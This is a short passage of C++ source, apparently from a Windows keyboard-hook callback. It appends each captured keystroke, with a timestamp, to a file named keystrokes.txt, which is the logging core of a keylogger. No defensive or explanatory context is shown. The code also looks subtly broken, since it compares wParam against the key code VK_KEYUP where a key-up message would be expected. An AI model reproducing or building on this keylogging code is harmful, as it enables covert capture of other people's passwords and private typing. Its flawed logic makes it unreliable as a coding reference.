                // Append to file
                ofstream myfile;
                myfile.open("keystrokes.txt", ios::app);
                myfile << key << " at " << time(nullptr) << endl;
                myfile.close();
            }
        } else if (wParam == VK_KEYUP) {
            // Key is released
            // Optionally log release events if needed
        }
    }
